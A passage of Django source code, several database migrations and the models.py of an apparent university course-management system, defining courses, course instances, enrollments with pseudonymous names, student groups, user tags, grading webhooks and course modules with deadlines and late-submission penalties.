/n/n/ncourse/migrations/0001_initial.py/n/n# -*- coding: utf-8 -*-


from django.db import models, migrations
import django.core.validators


class Migration(migrations.Migration):

    dependencies = [
        ('userprofile', '0001_initial'),
    ]

    operations = [
        migrations.CreateModel(
            name='Course',
            fields=[
                ('id', models.AutoField(verbose_name='ID', serialize=False, auto_created=True, primary_key=True)),
                ('name', models.CharField(max_length=255)),
                ('code', models.CharField(max_length=255)),
                ('url', models.CharField(help_text=b""Input an identifier for this course's URL."", unique=True, max_length=255, validators=[django.core.validators.RegexValidator(regex=b'^[\\w\\-\\.]*$')])),
                ('teachers', models.ManyToManyField(related_name='teaching_courses', to='userprofile.UserProfile', blank=True)),
            ],
            options={
            },
            bases=(models.Model,),
        ),
        migrations.CreateModel(
            name='CourseHook',
            fields=[
                ('id', models.AutoField(verbose_name='ID', serialize=False, auto_created=True, primary_key=True)),
                ('hook_url', models.URLField()),
                ('hook_type', models.CharField(default=b'post-grading', max_length=12, choices=[(b'post-grading', b'Post grading')])),
            ],
            options={
            },
            bases=(models.Model,),
        ),
        migrations.CreateModel(
            name='CourseInstance',
            fields=[
                ('id', models.AutoField(verbose_name='ID', serialize=False, auto_created=True, primary_key=True)),
                ('instance_name', models.CharField(max_length=255)),
                ('website', models.URLField(max_length=255, blank=True)),
                ('url', models.CharField(help_text=b'Input an URL identifier for this course.', max_length=255, validators=[django.core.validators.RegexValidator(regex=b'^[\\w\\-\\.]*$')])),
                ('starting_time', models.DateTimeField()),
                ('ending_time', models.DateTimeField()),
                ('visible_to_students', models.BooleanField(default=True)),
                ('assistants', models.ManyToManyField(related_name='assisting_courses', to='userprofile.UserProfile', blank=True)),
                ('course', models.ForeignKey(related_name='instances', to='course.Course', on_delete=models.CASCADE)),
            ],
            options={
            },
            bases=(models.Model,),
        ),
        migrations.AlterUniqueTogether(
            name='courseinstance',
            unique_together=set([('course', 'url')]),
        ),
        migrations.AddField(
            model_name='coursehook',
            name='course_instance',
            field=models.ForeignKey(related_name='course_hooks', to='course.CourseInstance', on_delete=models.CASCADE),
            preserve_default=True,
        ),
    ]
/n/n/ncourse/migrations/0005_auto_20150625_1835.py/n/n# -*- coding: utf-8 -*-
from __future__ import unicode_literals

from django.db import models, migrations
import django.utils.timezone
import lib.fields
import django.core.validators


class Migration(migrations.Migration):

    dependencies = [
        ('exercise', '0006_auto_20150625_1823'),
        ('userprofile', '0002_auto_20150427_1717'),
        ('inheritance', '0001_initial'),
        ('course', '0004_auto_20150625_1821'),
    ]

    state_operations = [
        migrations.CreateModel(
            name='CourseModule',
            fields=[
                ('id', models.AutoField(primary_key=True, serialize=False, auto_created=True, verbose_name='ID')),
                ('name', models.CharField(max_length=255)),
                ('url', models.CharField(max_length=255, validators=[django.core.validators.RegexValidator(regex='^(?!teachers$)(?!user$)[\\w\\-\\.]*$')], help_text='Input an URL identifier for this module. Taken words include: teachers, user')),
                ('chapter', models.IntegerField(default=1)),
                ('subchapter', models.IntegerField(default=1)),
                ('points_to_pass', models.PositiveIntegerField(default=0)),
                ('introduction', models.TextField(blank=True)),
                ('opening_time', models.DateTimeField(default=django.utils.timezone.now)),
                ('closing_time', models.DateTimeField(default=django.utils.timezone.now)),
                ('content_url', models.URLField(blank=True)),
                ('late_submissions_allowed', models.BooleanField(default=False)),
                ('late_submission_deadline', models.DateTimeField(default=django.utils.timezone.now)),
                ('late_submission_penalty', lib.fields.PercentField(default=0.5, help_text='Multiplier of points to reduce, as decimal. 0.1 = 10%')),
                ('course_instance', models.ForeignKey(related_name='course_modules', to='course.CourseInstance', on_delete=models.CASCADE)),
            ],
            options={
                'ordering': ['closing_time', 'id'],
            },
            bases=(models.Model,),
        ),
        migrations.CreateModel(
            name='LearningObjectCategory',
            fields=[
                ('id', models.AutoField(primary_key=True, serialize=False, auto_created=True, verbose_name='ID')),
                ('name', models.CharField(max_length=35)),
                ('description', models.TextField(blank=True)),
                ('points_to_pass', models.PositiveIntegerField(default=0)),
                ('course_instance', models.ForeignKey(related_name='categories', to='course.CourseInstance', on_delete=models.CASCADE)),
                ('hidden_to', models.ManyToManyField(blank=True, related_name='hidden_categories', null=True, to='userprofile.UserProfile')),
            ],
            options={
            },
            bases=(models.Model,),
        ),
        migrations.AlterUniqueTogether(
            name='learningobjectcategory',
            unique_together=set([('name', 'course_instance')]),
        ),
        migrations.AlterUniqueTogether(
            name='coursemodule',
            unique_together=set([('course_instance', 'url')]),
        ),
    ]

    operations = [
        migrations.SeparateDatabaseAndState(state_operations=state_operations)
    ]
/n/n/ncourse/migrations/0006_auto_20150721_1152.py/n/n# -*- coding: utf-8 -*-
from __future__ import unicode_literals

from django.db import models, migrations
import django.core.validators


class Migration(migrations.Migration):

    dependencies = [
        ('course', '0005_auto_20150625_1835'),
    ]

    operations = [
        migrations.CreateModel(
            name='CourseChapter',
            fields=[
                ('id', models.AutoField(auto_created=True, primary_key=True, verbose_name='ID', serialize=False)),
                ('order', models.IntegerField(default=1)),
                ('name', models.CharField(max_length=255)),
                ('url', models.CharField(help_text='Input an URL identifier for this chapter.', validators=[django.core.validators.RegexValidator(regex='^[\\w\\-\\.]*$')], max_length=255)),
                ('content_url', models.URLField(help_text='The resource to show.')),
                ('course_module', models.ForeignKey(related_name='chapters', to='course.CourseModule', on_delete=models.CASCADE)),
            ],
            options={
                'ordering': ['course_module', 'order', 'id'],
            },
            bases=(models.Model,),
        ),
        migrations.AlterUniqueTogether(
            name='coursechapter',
            unique_together=set([('course_module', 'url')]),
        ),
        migrations.AlterModelOptions(
            name='coursemodule',
            options={'ordering': ['closing_time', 'order', 'id']},
        ),
        migrations.RenameField(
            model_name='coursemodule',
            old_name='chapter',
            new_name='order',
        ),
        migrations.RemoveField(
            model_name='coursemodule',
            name='content_url',
        ),
        migrations.RemoveField(
            model_name='coursemodule',
            name='subchapter',
        ),
        migrations.AlterField(
            model_name='course',
            name='url',
            field=models.CharField(unique=True, validators=[django.core.validators.RegexValidator(regex='^[\\w\\-\\.]*$')], max_length=255, help_text='Input an URL identifier for this course.'),
            preserve_default=True,
        ),
        migrations.AlterField(
            model_name='coursemodule',
            name='url',
            field=models.CharField(help_text='Input an URL identifier for this module.', validators=[django.core.validators.RegexValidator(regex='^[\\w\\-\\.]*$')], max_length=255),
            preserve_default=True,
        ),
    ]
/n/n/ncourse/migrations/0011_auto_20151215_1133.py/n/n# -*- coding: utf-8 -*-
from __future__ import unicode_literals

from django.db import models, migrations


class Migration(migrations.Migration):

    dependencies = [
        ('course', '0010_auto_20151214_1714'),
    ]

    operations = [
        migrations.AddField(
            model_name='coursechapter',
            name='parent',
            field=models.ForeignKey(to='course.CourseChapter', blank=True, null=True, related_name='children', on_delete=models.CASCADE),
            preserve_default=True,
        ),
        migrations.AlterUniqueTogether(
            name='coursechapter',
            unique_together=set([]),
        ),
    ]
/n/n/ncourse/migrations/0021_auto_20160726_1209.py/n/n# -*- coding: utf-8 -*-
from __future__ import unicode_literals

from django.db import models, migrations


class Migration(migrations.Migration):

    dependencies = [
        ('userprofile', '0002_auto_20150427_1717'),
        ('course', '0020_auto_20160615_1239'),
    ]

    operations = [
        migrations.CreateModel(
            name='Enrollment',
            fields=[
                ('id', models.AutoField(auto_created=True, serialize=False, primary_key=True, verbose_name='ID')),
                ('timestamp', models.DateTimeField(auto_now_add=True)),
                ('personal_code', models.CharField(max_length=10, blank=True, default='')),
                ('course_instance', models.ForeignKey(to='course.CourseInstance', on_delete=models.CASCADE)),
                ('user_profile', models.ForeignKey(to='userprofile.UserProfile', on_delete=models.CASCADE)),
            ],
            options={
            },
            bases=(models.Model,),
        ),
        migrations.AddField(
            model_name='courseinstance',
            name='students2',
            field=models.ManyToManyField(to='userprofile.UserProfile', through='course.Enrollment', related_name='enrolled', blank=True),
            preserve_default=True,
        ),
    ]
/n/n/ncourse/migrations/0025_auto_20160728_1139.py/n/n# -*- coding: utf-8 -*-
from __future__ import unicode_literals

from django.db import models, migrations
import django.db.models.deletion


class Migration(migrations.Migration):

    dependencies = [
        ('userprofile', '0003_auto_20160728_1139'),
        ('course', '0024_auto_20160726_1232'),
    ]

    operations = [
        migrations.CreateModel(
            name='StudentGroup',
            fields=[
                ('id', models.AutoField(verbose_name='ID', primary_key=True, auto_created=True, serialize=False)),
                ('timestamp', models.DateTimeField(auto_now_add=True)),
                ('course_instance', models.ForeignKey(related_name='groups', to='course.CourseInstance', on_delete=models.CASCADE)),
                ('members', models.ManyToManyField(to='userprofile.UserProfile', related_name='groups')),
            ],
            options={
                'ordering': ['course_instance', 'timestamp'],
            },
            bases=(models.Model,),
        ),
        migrations.AddField(
            model_name='enrollment',
            name='selected_group',
            field=models.ForeignKey(null=True, on_delete=django.db.models.deletion.SET_NULL, default=None, blank=True, to='course.StudentGroup'),
            preserve_default=True,
        ),
    ]
/n/n/ncourse/migrations/0029_usertags.py/n/n# -*- coding: utf-8 -*-
from __future__ import unicode_literals

from django.db import models, migrations
import lib.models
import colorfield.fields


class Migration(migrations.Migration):

    dependencies = [
        ('userprofile', '0003_auto_20160728_1139'),
        ('course', '0028_auto_20160825_0601'),
    ]

    operations = [
        migrations.CreateModel(
            name='UserTag',
            fields=[
                ('id', models.AutoField(auto_created=True, serialize=False, primary_key=True, verbose_name='ID')),
                ('name', models.CharField(max_length=200)),
                ('description', models.CharField(blank=True, max_length=164, help_text='Describe the usage or meaning of this usertag')),
                ('visible_to_students', models.BooleanField(default=False)),
                ('color', colorfield.fields.ColorField(default='#CD0000', help_text='Color that is used for this tag.', max_length=10)),
                ('course_instance', models.ForeignKey(related_name='usertags', to='course.CourseInstance', on_delete=models.CASCADE)),
            ],
            options={
            },
            bases=(lib.models.UrlMixin, models.Model),
        ),
        migrations.CreateModel(
            name='UserTagging',
            fields=[
                ('id', models.AutoField(auto_created=True, serialize=False, primary_key=True, verbose_name='ID')),
                ('course_instance', models.ForeignKey(related_name='taggings', to='course.CourseInstance', on_delete=models.CASCADE)),
                ('tag', models.ForeignKey(related_name='taggings', to='course.UserTag', on_delete=models.CASCADE)),
                ('user', models.ForeignKey(related_name='taggings', to='userprofile.UserProfile', on_delete=models.CASCADE)),
            ],
            options={
            },
            bases=(models.Model,),
        ),
        migrations.AlterUniqueTogether(
            name='usertagging',
            unique_together=set([('tag', 'user', 'course_instance')]),
        ),
        migrations.AlterIndexTogether(
            name='usertagging',
            index_together=set([('user', 'course_instance')]),
        ),
    ]
/n/n/ncourse/models.py/n/nimport datetime
import json
import logging
import string
import urllib.request, urllib.parse
from random import randint, choice

from django.conf import settings
from django.contrib import messages
from django.contrib.contenttypes.fields import GenericRelation
from django.contrib.staticfiles import finders
from django.core.exceptions import ValidationError
from django.urls import reverse
from django.db import models
from django.db.models import Q, Count
from django.db.models.signals import post_save
from django.utils import timezone
from django.utils.functional import cached_property
from django.utils.translation import ugettext_lazy as _
from django_colortag.models import ColorTag

from apps.models import BaseTab, BasePlugin
from lib.email_messages import email_course_error
from lib.fields import PercentField
from lib.helpers import (
    safe_file_name,
    resize_image,
    roman_numeral,
    get_random_string,
    Enum,
)
from lib.remote_page import RemotePage, RemotePageException
from lib.models import UrlMixin
from lib.validators import generate_url_key_validator
from userprofile.models import User, UserProfile, GraderUser

logger = logging.getLogger(""course.models"")

# Read pseudonymization data from file
with open(finders.find('pseudonym.json')) as json_file:
    DATA = json.load(json_file)

class Course(UrlMixin, models.Model):
    """"""
    Course model represents a course in a university. A course has a name and an
    identification number. It also has a URL which is included in the addresses
    of pages under the course.
    """"""
    name = models.CharField(max_length=255)
    code = models.CharField(max_length=255)
    url = models.CharField(unique=True, max_length=255, blank=False,
        validators=[generate_url_key_validator()],
        help_text=_(""Input an URL identifier for this course.""))
    teachers = models.ManyToManyField(UserProfile,
        related_name=""teaching_courses"", blank=True)

    def __str__(self):
        return ""{} {}"".format(self.code, self.name)

    def clean(self):
        super().clean()
        RESERVED = (""admin"", ""accounts"", ""shibboleth"", ""api"",
            ""archive"", ""course"", ""exercise"", ""diploma"")
        if self.url in RESERVED:
            raise ValidationError({
                'url':_(""Taken words include: {}"").format(
                    "", "".join(RESERVED))
            })

    def is_teacher(self, user):
        return (
            user and
            user.is_authenticated and (
                user.is_superuser or (
                    isinstance(user, User) and
                    self.teachers.filter(id=user.userprofile.id).exists()
                ) or (
                    isinstance(user, GraderUser) and
                    user._course == self
                )
            )
        )


    ABSOLUTE_URL_NAME = ""course-instances""

    def get_url_kwargs(self):
        return dict(course_slug=self.url)


class StudentGroup(models.Model):
    """"""
    Stores a user group for a course instance.
    """"""
    course_instance = models.ForeignKey('CourseInstance', on_delete=models.CASCADE,
        related_name='groups')
    members = models.ManyToManyField(UserProfile, related_name='groups')
    timestamp = models.DateTimeField(auto_now_add=True)

    class Meta:
        ordering = ['course_instance','timestamp']

    @classmethod
    def get_exact(cls, course_instance, member_profiles):
        for group in cls.objects.filter(
            course_instance=course_instance,
            members=member_profiles[0]
        ):
            if group.equals(member_profiles):
                return group
        return None

    @classmethod
    def filter_collaborators_of(cls, members, profile):
        return [p for p in members if p != profile]

    @classmethod
    def format_collaborator_names(cls, members, profile):
        return "", "".join(p.user.get_full_name()
            for p in cls.filter_collaborators_of(members, profile))

    def equals(self, profiles):
        return set(self.members.all()) == set(profiles)

    def collaborators_of(self, profile):
        return self.filter_collaborators_of(self.members.all(), profile)

    def collaborator_names(self, profile):
        return self.format_collaborator_names(self.members.all(), profile)


class Enrollment(models.Model):
    """"""
    Maps an enrolled student in a course instance.
    """"""
    course_instance = models.ForeignKey('CourseInstance', on_delete=models.CASCADE)
    user_profile = models.ForeignKey(UserProfile, on_delete=models.CASCADE)
    timestamp = models.DateTimeField(auto_now_add=True)
    personal_code = models.CharField(max_length=10, blank=True, default='')
    selected_group = models.ForeignKey(StudentGroup, on_delete=models.SET_NULL,
        blank=True, null=True, default=None)
    anon_name = models.CharField(max_length=50, blank=True, default='')
    anon_id = models.CharField(max_length=50, blank=True, null=True, unique=True)

def create_enrollment_code(sender, instance, created, **kwargs):
    if created:
        easychars = '0123456789ABCDEFGHJKLMNPQRSTUVXYZ'
        code = get_random_string(6, easychars)
        while Enrollment.objects.filter(course_instance=instance.course_instance, personal_code=code).exists():
            code = get_random_string(6, easychars)
        instance.personal_code = code
        instance.save()

def create_anon_id(sender, instance, created, **kwargs):
    if created or not instance.anon_id:
        nums = string.digits + string.ascii_lowercase
        code = get_random_string(16, nums)
        i = 0
        while Enrollment.objects.filter(anon_id=code).exists():
            code = get_random_string(16, nums)
            i += 1
            if i > 10000:
                raise RuntimeError(""No anonymous user ids available"")
        instance.anon_id = code
        instance.save(update_fields=['anon_id'])

def pseudonymize(sender, instance, created, **kwargs):
    if created or not instance.anon_name:
        def namegen():
            '''
             If the color-animal pairs are starting to run out, add another color.
             This is highly unlikely, as there are roughly 140*68=9520 possible combinations
            '''
            second_name = """"
            if Enrollment.objects.filter(course_instance=instance.course_instance).count() > len(DATA[""colors""]) * len(DATA[""animals""]) * 0.75:
                second_name = choice(DATA[""colors""])[""name""]
            return choice(DATA[""colors""])[""name""] + second_name + "" "" + choice(DATA[""animals""])

        codename = namegen()
        i = 0
        while Enrollment.objects.filter(course_instance=instance.course_instance, anon_name=codename).exists():
            codename = namegen()
            i += 1
            if i > 10000:
                raise RuntimeError(""No anonymous usernames available"")
        instance.anon_name = codename
        instance.save(update_fields=['anon_name'])

post_save.connect(create_enrollment_code, sender=Enrollment)
post_save.connect(create_anon_id, sender=Enrollment)
post_save.connect(pseudonymize, sender=Enrollment)


class UserTag(UrlMixin, ColorTag):
    course_instance = models.ForeignKey('CourseInstance', on_delete=models.CASCADE,
        related_name=""usertags"")
    visible_to_students = models.BooleanField(default=False)

    class Meta:
        ordering = ['course_instance', 'name']

    def get_url_kwargs(self):
        return dict(tag_id=self.id, **self.course_instance.get_url_kwargs())

    def is_valid_slug(self, slug_candidate):
        assert self.course_instance
        return slug_candidate != '' and not UserTag.objects.filter(
            course_instance=self.course_instance,
            slug=slug_candidate,
        ).exists()


class UserTaggingManager(models.Manager):

    def tags_for_instance(self, course_instance):
        ts = self.filter(course_instance=course_instance)\
            .select_related('tag')
        return [t.tag for t in ts]

    def set(self, profile, tag):
        return self.get_or_create(
            tag=tag,
            user=profile,
            course_instance=tag.course_instance,
        )

    def unset(self, profile, tag):
        self.filter(
            tag=tag,
            user=profile,
        ).delete()


class UserTagging(models.Model):
    tag = models.ForeignKey(UserTag,
                            on_delete=models.CASCADE,
                            related_name=""taggings"")
    user = models.ForeignKey(UserProfile,
                             on_delete=models.CASCADE,
                             related_name=""taggings"",
                             db_index=True)
    course_instance = models.ForeignKey('CourseInstance',
                                        on_delete=models.CASCADE,
                                        related_name=""taggings"",
                                        db_index=True)
    objects = UserTaggingManager()

    def __str__(self):
        return 'tag: {tag}, user: {user}'.format(
            tag=self.tag.name,
            user=self.user.user.username
        )

    class Meta:
        unique_together = ('tag', 'user', 'course_instance')
        index_together = (
            ('user', 'course_instance'),
        )
        ordering = ['tag']


def get_course_visibility_filter(user, prefix=None):
    class OR(Q):
        default = Q.OR

    filters = (
        ('visible_to_students', True),
    )
    if isinstance(user, User):
        user = user.userprofile
        filters += (
            ('assistants', user),
            ('course__teachers', user),
        )
    elif isinstance(user, GraderUser):
        filters += (
            ('course', user._course),
        )
    filters = dict(
        ((prefix+name if prefix else name), val)
        for name, val in filters
    )
    return OR(**filters)


class CourseInstanceManager(models.Manager):
    """"""
    Helpers in CourseInstance.objects
    """"""

    def get_queryset(self):
        return super().get_queryset().select_related('course').order_by('-starting_time')

    def get_visible(self, user=None):
        if not user or not user.is_authenticated:
            return self.filter(visible_to_students=True)
        if not user.is_superuser:
            return self.filter(get_course_visibility_filter(user)).distinct()
        return self.all()


def build_upload_dir(instance, filename):
    """"""
    Returns the path to a directory where the instance image should be saved.
    """"""
    return ""public/course_instance_{:d}/{}"".format(
        instance.id,
        safe_file_name(filename)
    )


class CourseInstance(UrlMixin, models.Model):
    """"""
    CourseInstance class represent an instance of a course. A single course may have
    several instances either at the same time or during different years. All instances
    have the same teacher, but teaching assistants and students are connected to individual
    instances.
    """"""
    ENROLLMENT_AUDIENCE = Enum([
        ('INTERNAL_USERS', 1, _('Internal users')),
        ('EXTERNAL_USERS', 2, _('External users')),
        ('ALL_USERS', 3, _('Internal and external users')),
    ])
    VIEW_ACCESS = Enum([
        ('ENROLLED', 1, _('Enrolled students')),
        ('ENROLLMENT_AUDIENCE', 2, _('Enrollment audience')),
        ('ALL_REGISTERED', 3, _('All registered users')),
        ('PUBLIC', 4, _('Public to internet')),
    ])
    INDEX_TYPE = Enum([
        ('RESULTS', 0, _('User results')),
        ('TOC', 1, _(""Table of contents"")),
        ('LAST', 2, _(""Link to last visited content"")),
        ('EXPERIMENT', 10, _(""Experimental setup (hard-coded)"")),
    ])
    CONTENT_NUMBERING = Enum([
        ('NONE', 0, _(""No numbering"")),
        ('ARABIC', 1, _(""Arabic"")),
        ('ROMAN', 2, _(""Roman"")),
        ('HIDDEN', 3, _(""Hidden arabic"")),
    ])

    course = models.ForeignKey(Course, on_delete=models.CASCADE, related_name=""instances"")
    instance_name = models.CharField(max_length=255)
    url = models.CharField(max_length=255, blank=False,
        validators=[generate_url_key_validator()],
        help_text=_(""Input an URL identifier for this course instance.""))
    visible_to_students = models.BooleanField(default=True)
    enrollment_audience = models.IntegerField(choices=ENROLLMENT_AUDIENCE.choices,
                                              default=ENROLLMENT_AUDIENCE.INTERNAL_USERS)
    view_content_to = models.IntegerField(choices=VIEW_ACCESS.choices,
                                          default=VIEW_ACCESS.ENROLLED)
    starting_time = models.DateTimeField()
    ending_time = models.DateTimeField()
    lifesupport_time = models.DateTimeField(blank=True, null=True)
    archive_time = models.DateTimeField(blank=True, null=True)
    enrollment_starting_time = models.DateTimeField(blank=True, null=True)
    enrollment_ending_time = models.DateTimeField(blank=True, null=True)
    image = models.ImageField(blank=True, null=True, upload_to=build_upload_dir)
    language = models.CharField(max_length=255, blank=True, default="""")
    description = models.TextField(blank=True)
    footer = models.TextField(blank=True)
    index_mode = models.IntegerField(choices=INDEX_TYPE.choices, default=INDEX_TYPE.RESULTS,
        help_text=_('Select content for the course index page.'))
    module_numbering = models.IntegerField(choices=CONTENT_NUMBERING.choices,
                                           default=CONTENT_NUMBERING.ARABIC)
    content_numbering = models.IntegerField(choices=CONTENT_NUMBERING.choices,
                                            default=CONTENT_NUMBERING.ARABIC)
    head_urls = models.TextField(blank=True,
        help_text=_(""External CSS and JS resources ""
            ""that are included on all course pages. ""
            ""Separate with white space.""))
    configure_url = models.URLField(blank=True)
    build_log_url = models.URLField(blank=True)
    last_modified = models.DateTimeField(auto_now=True, blank=True, null=True)
    technical_error_emails = models.CharField(max_length=255, blank=True,
        help_text=_(""By default exercise errors are reported to teacher ""
            ""email addresses. Set this field as comma separated emails to ""
            ""override the recipients.""))
    plugins = GenericRelation(BasePlugin, object_id_field=""container_pk"",
                                      content_type_field=""container_type"")
    tabs = GenericRelation(BaseTab, object_id_field=""container_pk"",
                                   content_type_field=""container_type"")

    assistants = models.ManyToManyField(UserProfile, related_name=""assisting_courses"", blank=True)
    students = models.ManyToManyField(UserProfile, related_name=""enrolled"", blank=True, through='Enrollment')
    # usertags from course.models.UserTag
    # taggings from course.models.UserTagging
    # categories from course.models.LearningObjectCategory
    # course_modules from course.models.CourseModule

    objects = CourseInstanceManager()

    class Meta:
        unique_together = (""course"", ""url"")

    def __str__(self):
        return ""{}: {}"".format(str(self.course), self.instance_name)

    def clean(self):
        super().clean()
        errors = {}
        if self.ending_time <= self.starting_time:
            errors['ending_time'] = _(""Ending time must be later than starting time."")
        if self.lifesupport_time and self.lifesupport_time < self.ending_time:
            errors['lifesupport_time'] = _(""Lifesupport time must be later than ending time."")
        if (self.archive_time and not self.lifesupport_time) \
                or (self.lifesupport_time and not self.archive_time):
            # Must not set only one of lifesupport and archive time since their
            # default values could change their order. Lifesupport time must not
            # be earlier than archive time.
            errors['archive_time'] = _(""Lifesupport time and archive time must be either both set or both unset."")
        elif self.archive_time and self.archive_time < self.lifesupport_time:
            errors['archive_time'] = _(""Archive time must be later than lifesupport time."")
        if self.language.startswith(""|""):
            langs = list(filter(None, self.language.split(""|""))) # remove pipes & empty strings
            for lang in langs:
                if not self.is_valid_language(lang):
                    if ""language"" in errors:
                        errors['language'] += ("", "" + lang)
                    else:
                        errors['language'] = _(""Language code(s) missing from settings: "") + lang
        elif not self.is_valid_language(self.language):
            errors['language'] = _(""Language code missing from settings."")
        if errors:
            raise ValidationError(errors)

    def is_valid_language(self, lang):
        return lang == """" or lang in [key for key,name in settings.LANGUAGES]

    def save(self, *args, **kwargs):
        """"""
        Saves the model.
        """"""
        super().save(*args, **kwargs)
        if self.image:
            resize_image(self.image.path, (800,600))

    def is_assistant(self, user):
        return (
            user and
            user.is_authenticated and
            isinstance(user, User) and
            self.assistants.filter(id=user.userprofile.id).exists()
        )

    def is_teacher(self, user):
        return self.course.is_teacher(user)

    def is_course_staff(self, user):
        return self.is_teacher(user) or self.is_assistant(user)

    def is_student(self, user):
        return (
            user and
            user.is_authenticated and
            isinstance(user, User) and
            self.students.filter(id=user.userprofile.id).exists()
        )

    def is_enrollable(self, user):
        if user and user.is_authenticated and self.visible_to_students:
            if self.enrollment_audience == self.ENROLLMENT_AUDIENCE.INTERNAL_USERS:
                return not user.userprofile.is_external
            if self.enrollment_audience == self.ENROLLMENT_AUDIENCE.EXTERNAL_USERS:
                return user.userprofile.is_external
            return True
        return False

    def enroll_student(self, user):
        if user and user.is_authenticated:
            Enrollment.objects.get_or_create(course_instance=self, user_profile=user.userprofile)

    def tag_user(self, user, tag):
        UserTagging.objects.create(tag=tag, user=user.userprofile, course_instance=self)

    def get_enrollment_for(self, user):
        return Enrollment.objects.filter(course_instance=self, user_profile=user.userprofile).first()

    def get_user_tags(self, user):
        return self.taggings.filter(user=user.uesrprofile).select_related('tag')

    def get_course_staff_profiles(self):
        return UserProfile.objects.filter(Q(teaching_courses=self.course) | Q(assisting_courses=self))\
            .distinct()

    def get_student_profiles(self):
        return self.students.all()

    def get_submitted_profiles(self):
        return UserProfile.objects.filter(submissions__exercise__course_module__course_instance=self)\
            .distinct()\
            .exclude(assisting_courses=self)\
            .exclude(teaching_courses=self.course)

    def is_open(self, when=None):
        when = when or timezone.now()
        return self.starting_time <= when <= self.ending_time

    def is_past(self, when=None):
        when = when or timezone.now()
        return self.ending_time < when

    def is_on_lifesupport(self, when=None):
        when = when or timezone.now()
        return self.lifesupport_start < when

    def is_archived(self, when=None):
        when = when or timezone.now()
        return self.archive_start < when

    @property
    def archive_start(self):
        if self.archive_time: # not null
            return self.archive_time
        return self.ending_time + datetime.timedelta(days=365)

    @property
    def lifesupport_start(self):
        if self.lifesupport_time: # not null
            return self.lifesupport_time
        return self.ending_time + datetime.timedelta(days=365)

    @property
    def enrollment_start(self):
        return self.enrollment_starting_time or self.starting_time

    @property
    def enrollment_end(self):
        return self.enrollment_ending_time or self.ending_time

    def is_enrollment_open(self):
        return self.enrollment_start <= timezone.now() <= self.enrollment_end

    def has_enrollment_closed(self):
        return timezone.now() > self.enrollment_end

    def is_visible_to(self, user=None):
        if self.visible_to_students:
            return True
        return user and self.is_course_staff(user)

    @property
    def head_css_urls(self):
        return [url for url in self.head_urls.split() if "".css"" in url]

    @property
    def head_js_urls(self):
        return [url for url in self.head_urls.split() if "".js"" in url]

    ABSOLUTE_URL_NAME = ""course""
    EDIT_URL_NAME = ""course-edit""

    def get_url_kwargs(self):
        # dict(foo=bar, **baz()) is not nice, but it's cleanest solution for this
        # specific problem. For more read out stackoverflow answer about merging
        # python dicts in single line: http://stackoverflow.com/a/26853961
        return dict(instance_slug=self.url, **self.course.get_url_kwargs())


class CourseHook(models.Model):
    """"""
    Provides a hook for a course instance, that is called after a certain
    action. Currently only hook implemented is post-grading, i.e. after a
    student submission has been successfully graded by the external service.

    When a hook is triggered it will do a HTTP POST to a defined URL
    passing along data (e.g. submission id).
    """"""

    HOOK_CHOICES = (
        (""post-grading"", ""Post grading""),
    )

    hook_url = models.URLField()
    hook_type = models.CharField(max_length=12, choices=HOOK_CHOICES, default=""post-grading"")
    course_instance = models.ForeignKey(CourseInstance, on_delete=models.CASCADE,
        related_name=""course_hooks"")

    def __str__(self):
        return ""{} -> {}"".format(self.course_instance, self.hook_url)

    def trigger(self, data):
        logger = logging.getLogger(""plus.hooks"")
        try:
            urllib.request.urlopen(self.hook_url,
                urllib.parse.urlencode(data).encode('utf-8'), timeout=10)
            logger.info(""%s posted to %s on %s with %s"",
                        self.hook_type, self.hook_url, self.course_instance, data)
        except:
            logger.error(""HTTP POST failed on %s hook to %s (%s)"",
                         self.hook_type, self.hook_url, self.course_instance)


class CourseModuleManager(models.Manager):
    def get_queryset(self):
        return super().get_queryset().select_related(
            'course_instance', 'course_instance__course')

    def get_visible(self, user=None):
        if not user or not user.is_authenticated:
            return self.filter(
                course_instance__visible_to_students=True,
                opening_time__lte=timezone.now(),
            )
        if not user.is_superuser:
            return self.filter(
                get_course_visibility_filter(user, 'course_instance__'),
                opening_time__lte=timezone.now(),
            ).distinct()
        return self.all()


class CourseModule(UrlMixin, models.Model):
    """"""
    CourseModule objects connect chapters and learning objects to logical sets
    of each other and course instances. They also contain information about the
    opening times and deadlines for exercises.
    """"""
    STATUS = Enum([
        ('READY', 'ready', _(""Ready"")),
        ('UNLISTED', 'unlisted', _(""Unlisted in table of contents"")),
        ('HIDDEN', 'hidden', _(""Hidden"")),
        ('MAINTENANCE', 'maintenance', _(""Maintenance"")),
    ])
    status = models.CharField(max_length=32,
        choices=STATUS.choices, default=STATUS.READY)
    order = models.IntegerField(default=1)
    name = models.CharField(max_length=255)
    url = models.CharField(max_length=255,
                       validators=[generate_url_key_validator()],
                       help_text=_(""Input an URL identifier for this module.""))
    points_to_pass = models.PositiveIntegerField(default=0)
    introduction = models.TextField(blank=True)
    course_instance = models.ForeignKey(CourseInstance, on_delete=models.CASCADE,
        related_name=""course_modules"")
    opening_time = models.DateTimeField(default=timezone.now)
    closing_time = models.DateTimeField(default=timezone.now)

    # early_submissions_allowed= models.BooleanField(default=False)
    # early_submissions_start = models.DateTimeField(default=timezone.now, blank=True, null=True)
    # early_submission_bonus  = PercentField(default=0.1,
    #   help_text=_(""Multiplier of points to reward, as decimal. 0.1 = 10%""))

    late_submissions_allowed = models.BooleanField(default=False)
    late_submission_deadline = models.DateTimeField(default=timezone.now)
    late_submission_penalty = PercentField(default=0.5,
        help_text=_(""Multiplier of points to reduce, as decimal. 0.1 = 10%""))

    objects = CourseModuleManager()

    class Meta:
        unique_together = (""course_instance"", ""url"")
        ordering = ['order', 'closing_time', 'id']

    def __str__(self):
        if self.order > 0:
            if self.course_instance.module_numbering == CourseInstance.CONTENT_NUMBERING.ARABIC:
                return ""{:d}. {}"".format(self.order, self.name)
            elif self.course_instance.module_numbering == CourseInstance.CONTENT_NUMBERING.ROMAN:
                return ""{} {}"".format(roman_numeral(self.order), self.name)
        return self.name

    def clean(self):
        super().clean()
        errors = {}
        RESERVED = (""toc"", ""teachers"", ""user"", ""exercises"", ""apps"", ""lti-login"")
        if self.url in RESERVED:
            errors['url'] = _(""Taken words include: {}"").format("", "".join(RESERVED))
        if self.opening_time > self.closing_time:
            errors['opening_time'] = _(""Opening time must be earlier than the closing time."")
        if self.late_submissions_allowed and self.late_submission_deadline <= self.closing_time:
            errors['late_submission_deadline'] = _(""Late submission deadline must be later than the closing time."")
        if errors:
            raise ValidationError(errors)

    def is_open(self, when=None):
        when = when or timezone.now()
        return self.opening_time <= when <= self.closing_time

    def is_after_open(self, when=None):
        """"""
        Checks if current time is past the round opening time.
        """"""
        when = when or timezone.now()
        return self.opening_time <= when

